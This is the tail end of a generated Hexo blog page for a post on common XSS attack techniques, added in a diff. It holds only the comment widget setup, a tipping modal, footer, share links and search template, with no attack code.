+    <!-- Valine Comments script -->
+    <script>
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+          return GUEST_INFO.indexOf(item) > -1
+        });
+        new Valine({
+            el: '#comments',
+            notify: 'false' == 'true',
+            verify: 'false' == 'true',
+            appId: "gnMQ4bW3FRMELqY7UJSFCG2L-gzGzoHsz",
+            appKey: "8kUBso0hYLBcTE8e9h89D1Hc",
+            avatar: "mm",
+            placeholder: "Just go go",
+            guest_info: guest_info.length == 0 ? GUEST_INFO : guest_info,
+            pageSize: "10"
+        })
+    </script>
+    <!-- Valine Comments end -->
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Recall HYX &copy; 2017 - 2018</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&title=《XSS常用攻击手段》 — Recall Hyx&pic=https://recallhyx.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&title=《XSS常用攻击手段》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XSS常用攻击手段》 — Recall Hyx&url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/&via=https://recallhyx.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3aQW4CMQwF0N7/0tNtFyXz7QQkPC8rRIHmUcn9dvLzE6/rxfr70/Xr15/56pnDCwMD42sZ13Ktt5VstPoJ63e9/I0YGBgPYCSbyAtl9Zm8lL98HgMDA2MZ105FRgwMDIzPFNw8XK4xGBgYGL0mdqeMVudmb+zFMTAwvpDR++jPPH7L+QYGBsZXMa7iSuJaNepVQ+Q/u8LAwBjNyAvcqQFZs0FN9oOBgTGUkTSEvdDW23SzDcbAwBjNSMZb1RZ3pxnOY+XN/w0MDIxBjGrB7V2YWLem+zERAwNjNmPnPKG6raR0bsEwMDCGMvLiWA1zScSsNs83fwcMDIzRjDwOVktnFdO8cIaBgfEAxs5liF65rA74bvaAgYHxAMbh8lfcelLib+IsBgbGAxi9q6v7TeypbhQDA2M249QALg+LSRnduUCGgYExj9ErqdUjhJ2qGL0XAwNjNKM38Oq9vjpoKyMxMDBGM3bC3M5gLkHm4zkMDIzZjOowq1qU86+gOqornHJgYGCMYOyEvF4Zzb+m5NAUAwPjCYzq42RzPWovqmJgYExlXMW1P4brBcQbKgYGxmhGvqqjsfyuR/L63vEqBgbGJEZSNHvXufKmt3qketOLY2BgDGWcim77xwN56cfAwMDoBbizx5yF41UMDAyMIMD1YmKy0aTcY2BgPIGRNLF5o9tsRIuXNjAwMJ7DyFvHPLTtt7i9Yo2BgTGO8Qsa/9sZSJe6WAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
